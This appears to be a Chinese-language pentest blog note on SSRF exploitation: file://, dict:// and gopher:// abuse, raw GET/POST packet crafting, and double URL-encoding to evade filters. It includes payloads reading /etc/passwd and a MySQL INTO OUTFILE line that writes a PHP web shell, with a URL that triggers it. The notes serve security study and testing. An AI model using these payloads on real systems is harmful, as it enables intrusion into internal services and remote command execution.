---
title: "SSRF 利用笔记：协议利用、gopher 构造与内网服务攻击"
slug: ssrf-protocols-gopher-internal-services
cover: ""
date: 2026-01-08
categories:
  - Web安全
  - SSRF
  - top10
tags:
  - SSRF
  - MySQL
  - gopher
  - 内网探测
halo:
  site: http://www.hzhsec.top
  name: e0d87a7d-205a-465f-9c8f-bbd6e7c0e32a
  publish: true
---

<!--more-->





## 概述

下面把你提供的片段整理为 Hugo 可用的 Markdown 格式（包含前置元数据），保持原始示例与命令/报文不变，便于直接复制到 `content/` 下作为教程页面。

------

## file:// 协议

可以通过以下路径检查或读取目标可访问的本地文件：

```
file:///etc/passwd      # 检查是否能读取 /etc/passwd
file:///etc/hosts       # 查看本机 hosts，用于推断内网映射与网段信息
file:///proc/net/arp    # 查看本机 ARP 记录，了解局域网活动主机
```

> 注意：现代浏览器或服务一般会限制 `file://` 访问，但在某些服务端 SSRF 场景下仍可能被利用。

------

## dict://

```
dict://ip:port/info
```

用途：部分服务或自定义实现可能暴露 `dict` 协议接口，可用于探测服务信息或扫描特定 ID，结果依赖目标实现而异。

------

## http://

```
http://
```

用途：最常见的 SSRF 载体，用于扫描内网主机、读取主机上可访问的文件或内网 Web 服务。

------

## gopher://

```
# 说明
该伪协议默认端口为 70
传输数据时，部分实现会“吞掉”第一个字符
示例： gopher://ip:port/_XXX
```

- `gopher` 协议常用于在 SSRF 中构造原始 TCP 请求（可对数据库、Redis、SMTP 等服务直接发协议字节流）。
- 对于某些目标，需注意实现差异（如第一个字符被吃掉等问题）。

------

## GET 传输 示例与注意事项

**示例 payload：**

```
GET /name.php?name=666 HTTP/1.1
Host: 172.250.250.4
```

**注意：**

1. HTTP 报文每行必须以 CRLF（`\r\n`）结尾，报文末尾需有额外空行表示头部结束。
2. URL 中的特殊字符必须做 URL 编码，例如：
   - `?` -> `%3F`
   - 换行 -> `%0D%0A`
   - 空格 -> `%20`
      或在数据框中对整个 URL 做一次“全编码”。
3. 在 Burp Suite 等工具中修改数据包时，尝试对 payload 做两次 URL 编码以绕过某些过滤规则。

------

## POST 传输 示例与注意事项

**示例 payload：**

```
POST /name.php HTTP/1.1
Host: 172.250.250.4
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

name=hzh
```

**注意：**

- `Content-Length` 必须精确等于请求体的字节长度。
- POST 数据如含特殊字符，按需做 URL 编码；在某些场景为了绕过检测需要做两次 URL 编码。
- 推荐使用 Burp Repeater、netcat、socat 等工具调试原始报文的 CRLF 与长度问题。

------

## gopher 协议与 SQL 注入的特殊点

- 使用 `gopher` 对 SQL 注入或数据库协议时，尽量避免空格、`+` 等字符；应对这些字符进行 URL 编码（例如空格 -> `%20`）。
- 手工分析时，可使用 `tcpdump` 抓包并用 Wireshark 查看握手与原始字节流，以确保 payload 格式正确。
- 工具：`gopherus` 可帮助生成 gopher payload，方便构造面向 TCP 的原始请求。

------

## SSRF 针对 MySQL 的利用（未授权查询与文件写入）

### 手工抓取与分析

- 手工抓包：使用 `tcpdump -w` 保存原始握手包，用 Wireshark 分析并截取发送的原始指令数据。
- 生成 gopher payload 时可用脚本按规则（如每两个字节前加 `%`）编码，或直接用 `gopherus` 等工具生成。

### 未授权查询（思路）

- 通过 SSRF 将构造好的 MySQL 协议请求发送到目标 MySQL（默认端口 3306），尝试进行未授权查询（现代 MySQL 一般有认证，成功概率取决于配置/漏洞）。

### 未授权文件写入（示例 SQL）

当 `secure_file_priv` 未设置或为空时，MySQL 可能允许向可写路径写文件，可利用如下 SQL 将 web 后门写入：

```
SELECT '<?php system($_GET[\"smd\"]);?>' INTO OUTFILE '/var/www/html/cmd.php';
```

写入成功后，可访问 `http://target/cmd.php?smd=whoami`（视目标环境与权限而定）来触发命令执行。

------

## 小结与安全建议

- 在构造原始报文（GET/POST）时，务必保证 CRLF 与 `Content-Length` 的准确性；复杂场景下尝试双重 URL 编码以绕过过滤。
- `gopher` 是 SSRF 中强力的“原始 TCP”载体，但需注意协议实现差异（如字符丢失）与编码问题。
- 对 MySQL 等内部服务的未授权访问/写入依赖目标配置（如 `secure_file_priv`），在测试时应先抓包并确认交互格式。